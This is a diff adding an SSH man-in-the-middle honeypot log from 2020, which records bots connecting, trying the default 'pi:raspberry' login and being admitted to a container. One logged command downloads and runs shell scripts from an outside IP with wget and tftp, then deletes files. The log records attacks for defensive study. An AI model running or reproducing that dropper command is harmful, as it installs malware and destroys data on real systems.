@@ -1,0 +1,28 @@
+2020-10-28 20:22:58.489 - [Info] MITM Version: 1.26
+2020-10-28 20:22:58.496 - [Info] Auto Access Enabled: true
+2020-10-28 20:22:58.496 - [Debug] [Init] Auto Access Barrier: true
+2020-10-28 20:22:58.517 - [Info] SSH man-in-the-middle server for 172.20.0.202 listening on 0.0.0.0:10001
+2020-10-28 20:23:09.409 - [Debug] [Connection] Attacker connected: 207.154.220.193 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-28 20:23:10.954 - [Debug] [Auth] Attacker 207.154.220.193 trying to authenticate with "password"
+2020-10-28 20:23:10.956 - [Debug] [Auto Access] Attacker: 207.154.220.193, Threshold: 1, Attempts: 1
+2020-10-28 20:23:10.961 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-28 20:23:10.961 - [Debug] [Auto Access] Adding the following credentials: "pi:raspberry"
+2020-10-28 20:23:11.599 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-28 20:23:11.600 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.202
+2020-10-28 20:23:11.696 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-28 20:23:12.154 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /run || cd /; wget http://104.168.195.213/Thorbins.sh; chmod 777 Thorbins.sh; sh Thorbins.sh; tftp 104.168.195.213 -c get Thortftp1.sh; chmod 777 Thortftp1.sh; sh Thortftp1.sh; tftp -r Thortftp2.sh -g 104.168.195.213; chmod 777 Thortftp2.sh; sh Thortftp2.sh; rm -rf Thorbins.sh Thortftp1.sh Thortftp2.sh; rm -rf *
+2020-10-28 20:23:29.524 - [Debug] [Connection] Attacker connected: 207.154.220.193 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-28 20:23:30.958 - [Debug] [Auth] Attacker 207.154.220.193 trying to authenticate with "password"
+2020-10-28 20:23:30.958 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-28 20:23:30.959 - [Debug] [Auth] Attacker: 207.154.220.193 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-28 20:23:31.193 - [Debug] [Connection] Attacker closed the connection
+2020-10-28 20:23:42.866 - [Debug] [Connection] Attacker closed connection
+2020-10-28 20:23:42.871 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-28 20:23:42.871 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-10-28 20:26:24.248 - [Debug] [Connection] Attacker connected: 109.236.91.85 | Client Identification: SSH-2.0-OpenSSH_5.3
+2020-10-28 20:26:25.268 - [Debug] [Auth] Attacker 109.236.91.85 trying to authenticate with "none"
+2020-10-28 20:26:25.268 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-28 20:26:25.495 - [Debug] [Auth] Attacker 109.236.91.85 trying to authenticate with "password"
+2020-10-28 20:26:25.496 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-28 20:26:25.496 - [Debug] [Auth] Attacker: 109.236.91.85 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-28 20:26:25.716 - [Debug] [Connection] Attacker closed the connection
